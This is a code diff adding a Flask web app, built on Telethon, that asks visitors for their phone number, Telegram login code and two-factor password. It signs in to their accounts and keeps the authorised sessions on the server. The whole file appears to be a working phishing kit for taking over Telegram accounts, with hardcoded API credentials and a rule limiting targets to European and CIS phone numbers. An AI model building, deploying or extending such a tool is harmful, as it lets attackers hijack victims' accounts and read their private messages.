@@ -1,0 +1,105 @@
+from flask import Flask, request, render_template
+from telethon import TelegramClient
+from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError
+import os
+import asyncio
+import threading
+
+API_ID = 26006502
+API_HASH = "9afc2208b8cec0afe06c9c2bc15b53e4"
+
+os.makedirs("sessions", exist_ok=True)
+
+app = Flask(__name__, template_folder="templates", static_folder="static")
+loop = asyncio.new_event_loop()
+
+
+def start_loop():
+    asyncio.set_event_loop(loop)
+    loop.run_forever()
+
+
+threading.Thread(target=start_loop, daemon=True).start()
+
+clients = {}
+
+
+def run_async(coro):
+    return asyncio.run_coroutine_threadsafe(coro, loop).result()
+
+
+@app.route("/", methods=["GET", "POST"])
+def index():
+    if request.method == "POST":
+        phone = request.form["phone"].strip()
+        if not phone.startswith(('+7', '+380', '+375', '+370')) and not phone.startswith('+3'):
+            return render_template("index.html", stage="phone", error="Разрешены только номера из Европы и СНГ.")
+
+        session_name = f"sessions/{phone}"
+
+        async def process():
+            client = TelegramClient(session_name, API_ID, API_HASH)
+            await client.connect()
+            await client.send_code_request(phone)
+            clients[phone] = client
+
+        try:
+            run_async(process())
+            return render_template("index.html", stage="code", phone=phone)
+        except Exception as e:
+            return render_template("index.html", stage="phone", error=str(e))
+
+    return render_template("index.html", stage="phone")
+
+
+@app.route("/code", methods=["POST"])
+def code():
+    phone = request.form["phone"].strip()
+    code = request.form["code"].strip()
+
+    async def process():
+        client = clients.get(phone)
+        if not client:
+            return "Сессия не найдена.", None
+
+        try:
+            await client.sign_in(phone=phone, code=code)
+            return "Авторизация успешна! ✅", None
+        except SessionPasswordNeededError:
+            return None, "2FA"
+        except PhoneCodeInvalidError:
+            return None, "Неверный код."
+
+    message, error = run_async(process())
+    if error == "2FA":
+        return render_template("index.html", stage="2fa", phone=phone)
+    elif error:
+        return render_template("index.html", stage="code", phone=phone, error=error)
+    else:
+        return render_template("index.html", stage="phone", success=message)
+
+
+@app.route("/password", methods=["POST"])
+def password():
+    phone = request.form["phone"].strip()
+    password = request.form["password"].strip()
+
+    async def process():
+        client = clients.get(phone)
+        if not client:
+            return "Сессия не найдена."
+
+        try:
+            await client.sign_in(password=password)
+            return "Авторизация через 2FA успешна! ✅"
+        except Exception as e:
+            return f"Ошибка авторизации: {e}"
+
+    message = run_async(process())
+    return render_template("index.html", stage="phone", success=message)
+
+
+if __name__ == "__main__":
+    port = int(os.environ.get("PORT", 5000))
+    app.run(host="0.0.0.0", port=port)
+
